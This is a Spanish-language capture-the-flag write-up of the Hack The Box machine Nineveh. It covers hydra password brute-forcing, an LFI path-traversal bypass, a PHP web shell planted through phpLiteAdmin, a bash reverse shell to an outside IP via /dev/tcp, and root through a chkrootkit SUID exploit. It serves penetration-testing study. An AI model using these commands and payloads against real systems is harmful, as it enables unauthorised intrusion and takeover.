# 10.10.10.43 - Nineveh
![Nineveh](https://user-images.githubusercontent.com/96772264/205054534-4ab9aaf2-479e-4440-8068-4f837c0e6c0d.png)

-----------------------
# Parte 1: Reconocimiento

Puertos abiertos 80(http), 443(https):
- Puerto 80 -> Apache/2.4.18
- Puerto 443 -> Apache/2.4.18, nineveh.htb

Ponemos en el **/etc/hosts** el dominio **nineveh.htb**
La web del puerto 443 nos muestra una foto (pero hacerle un exiftool o strings para ver contenido oculto no devuelve nada)

![nine1](https://user-images.githubusercontent.com/96772264/205054606-ed6a1eb4-2b23-411d-8091-56e9a4ed844b.PNG)

-------------------------------
# Parte 2: Web del puerto 80 -> LFI

![nine2](https://user-images.githubusercontent.com/96772264/205055109-dd9018b6-6572-49fb-8369-8f789bcb108a.PNG)

Fuzzing:
```console
└─$ wfuzz -c --hl=5 -w $(locate subdomains-top1million-5000.txt) -H "Host: FUZZ.nineveh.htb" -u http://nineveh.htb/ -t 100
└─$ wfuzz -c --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://nineveh.htb/FUZZ/
000003008:   200        1 L      3 W        68 Ch       "department"
```
La página **/department** tiene un panel de login. Si pongo de usaurio "admin" me sale "Invalid Password!" 

```console
└─$ hydra -P /usr/share/wordlists/rockyou.txt -l admin nineveh.htb http-post-form '/department/login.php:username=admin&password=^PASS^:F=Invalid Password!' -t 64
[80][http-post-form] host: nineveh.htb   login: admin   password: 1q2w3e4r5t
```
Conseguimos entrar con esa contraseña, y encontramos en **/notes**
![Captura](https://user-images.githubusercontent.com/96772264/205055034-bc54dfc6-bb78-475d-b5da-f623065228f5.PNG)

```
Mira tu carpeta secreta para llegar! Deducela! Ese es tu reto

Mejora la interfaz de la base de datos
~amrois
```

Si vemos la url tenemos: "10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt" Ademas tenemos una cookie del tipo PHPSESSID  
```console
└─$ curl -s --cookie "PHPSESSID=r9rc4nq15k34d7e09ua4m6jaq3" http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt
```
Hacemos un script para interactuar mas cómodamente "files.sh"  
```bash
#!/bin/bash

while true; do
    echo -n "$:> " && read file
    curl -s --cookie "PHPSESSID=r9rc4nq15k34d7e09ua4m6jaq3" \
    http://10.10.10.43/department/manage.php?notes=$file | html2text
done
```
```console
└─$  files.sh
$:> files/ninevehNotes.txt # lo mismo
$:> ../../../../files/ninevehNotes.txt # path traversal
Warning:  include(): Failed opening '../../../../files/ninevehNotes.txt' for inclusion 
(include_path='.:/usr/share/php') in /var/www/html/department/manage.php on line 31
$:> files/ninevehNotes.txt/../../../../../../etc/passwd # el mismo error
$:> files/ # No Note is selected.
$:> /var/www/html/department/manage.php # No Note is selected
$:> files/ninevehNote # No Note is selected.
$:> files/ninevehNotes # el error largo 
$:> files/ninevehNotes/../../../../../../../etc/passwd  # Asi se logra bypasear esto
```
Esto se debe a que "files/ninevehNotes" esta whitelisteado, es decir tiene que estar por narices  
```bash
file=$1
curl -s --cookie "PHPSESSID=r9rc4nq15k34d7e09ua4m6jaq3" \
http://10.10.10.43/department/manage.php?notes=files/ninevehNotes/../../../../../../$file | html2text
```
```console
└─$ ./files.sh /etc/passwd | grep "sh$"
# Usuarios -> el amrois este
└─$ ./files.sh /proc/net/fib_trie | grep "LOCAL" -B 1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u  | tr "\n" " "
# 10.10.10.43 127.0.0.1 # O sea no hay dockers
└─$ ./files.sh /proc/net/tcp
# Puerto 22, 443 y 80.
```

----------------------------
# Parte 3: Web del puerto 443

```console
└─$ curl -s https://nineveh.htb/ninevehForAll.png -k -O
└─$ exiftool ninevehForAll.png # Nada interesante aparte de Software : Shutter

└─$ wfuzz -c --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt https://nineveh.htb/FUZZ/
000000835:   200        485 L    974 W      11430 Ch    "db"
000095763:   200        5 L      7 W        71 Ch       "secure_notes"
```

secure-notes nos da una imagen:
![nine7](https://user-images.githubusercontent.com/96772264/205055213-2b24cf05-924e-403a-81d7-71ae7cbe6aaa.PNG)

```console
└─$ curl https://10.10.10.43/secure_notes/nineveh.png -O -k
└─$ exiftool nineveh.png # Nada
└─$ strings nineveh.png
# llave de amrois y llave privada que copiamos con el nombre id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
...
└─$ chmod 600 id_rsa
└─$ ssh -i id_rsa amrois@nineveh.htb
# Error puerto 22 cerrado
```

Tenemos un panel de login, si le ponemos la contraseña que obtuvimos en la otra vez con hydra dice "Incorrect password." 
![nine4](https://user-images.githubusercontent.com/96772264/205055236-0bd58413-1079-490e-9dd6-0c4e68c52204.PNG)

```console
└─$ hydra -P /usr/share/wordlists/rockyou.txt -l admin nineveh.htb https-post-form '/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:F=Incorrect password' -t 64
[443][http-post-form] host: nineveh.htb   login: admin   password: password123
```
Entramos, Nos topamos con un panel de administración:  
Como no sabemos aparentemente que hacer y tenemos que esto se llama phpLiteAdmin: ```searchsploit phpliteadmin```  

El exploit "24044.txt" dice que:  
1. Php lite admin te puede dejar crear una base de datos, si no le pones una extension (ej database.db) se la pone ello solo.  
2. Un atacante puede crear una database.php ej "hack.php" que esto guardará esa base de datos sqlite en el mismo lado que phpliteadmin.php  
3. Crear una tabala en esa database y meter como texto "<?php phpinfo()?>"   
4. Correrlo    

![nine5](https://user-images.githubusercontent.com/96772264/205055263-3d72f022-3f7c-4452-b83d-719b2acbf5a5.PNG)
![nine6](https://user-images.githubusercontent.com/96772264/205055282-d890aeed-70ef-4066-8965-5f4741c35db2.PNG)

Creamos la database/tabla y le ponemos como texto ```<?php system($_GET["cmd"]); ?>```  
Dice que la ruta donde lo guarda es "/var/tmp/hack.php:  
```console
└─$ ./files.sh /var/tmp/hack.php
Parse error:  syntax error, unexpected 'cmd' (T_STRING), expecting ']' in /var/
└─$ ./files.sh "var/tmp/hack.php&cmd=pwd";   # el & en lugar de ? por haber un ? previo.
```

----------------------------
# Parte 4: En el sistema

```bash -c 'bash -i >& /dev/tcp/10.10.14.16/666 0>&1'``` Cambiando los "&" por "%26" y tenemos la shell:
Si enumeramos el sistema con nuestro [script de confianza](https://github.com/CUCUxii/Pentesting-tools/blob/main/lin_info_xii.sh)
- Usarios: root y amrois  
- /etc/apache2/sites-enabled/000-default.conf  
- Backups: /var/backups/group.bak /var/backups/gshadow.bak /var/backups/passwd.bak /var/backups/shadow.bak  
- Corriendo el /usr/sbin/knockd   

Knock es un programa para abrir puertos en el firewall (el 22 en este caso) "golpeando" otros antes, como una especie de contraseña: 
```console
www-data@nineveh:/tmp$ cat /etc/knockd.conf
[openSSH]  sequence = 571, 290, 911 
└─$ for port in 571 290 911; do nmap -Pn --host-timeout 100 --max-retries 0 -p $port 10.10.10.43 ; done
# Ya con esto tenemos los puertos abiertos
└─$ ssh -i id_rsa amrois@nineveh.htb
amrois@nineveh:~$
```

Tambien subimos el [procmon.sh](https://github.com/CUCUxii/Pentesting-tools/blob/main/procmon.sh)  
- /bin/sh /usr/bin/chkrootkit  

Buscamos el exploit y damos con "linux/local/33899.txt"  **CVE-2014-0476**
Los pasos que da el exploit (segun esto ejecutar todo archivo llamado /tmp/update): 
```console
amrois@nineveh:~$ nano /tmp/update
#!/bin/bash
chmod u+s /bin/bash
amrois@nineveh:~$ chmod +x /tmp/update
amrois@nineveh:~$ bash -p
bash-4.3# whoami
root
```
La explicación es un error en el código del chkrootkit por no entrecomillar una linea.
```bash
SLAPPER_FILES="/tmp/.bugtraq /tmp/.bugtraq.c /tmp/.unlock /tmp/httpd /tmp/update"

for i in ${SLAPPER_FILES}; do   # Por cada uno de estos archivos (que se almacenan como $i)
   if [ -f ${i} ]; then			# Si no es una carpeta
      file_port=$file_port $i	# Esta linea ejecuta i porque que faltan los "" (entonces no es una string sino un comando) -> "$file_port $i"
      STATUS=1					# Lo da por bueno
   fi
```
----------------------------
# Extra: Estenografía

```
└─$ binwalk nineveh.png                                                                                         13DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 1497 x 746, 8-bit/color RGB, non-interlaced
84            0x54            Zlib compressed data, best compression
2881744       0x2BF8D0        POSIX tar archive (GNU)
```

Si hacemos un vim a la foto
```console
10395 <85>^DGaÐXt6[åpy]=]µJ~×`ÈeRB<99><82>E'n^[^Nh4FÐåùå/...
      @^@^@^@^@^@^@^@^@^@^@^@^@-----BEGIN RSA PRIVATE KEY-----
10396 MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
```
Todos esos caracteres raros ^DGaÐ son los bits de la foto forzadamente pasados a ascii o sea el bit que puede significar "traduce este pixel a 130% de rojo"
se puede traducir por ejemplo en "A}". Los que se ven "@^" esque no tienen traduccion posible ya que 256 (posibles valores numericos de un bit) es mayor que 
el numero de caracteres unicode o ascii asi que hay muchos que se quedan sin nada. 
Entre toda esa sopa de bits, si que hay fragmentos de texto escondidos que son utiles, o sea la informacion escondida.







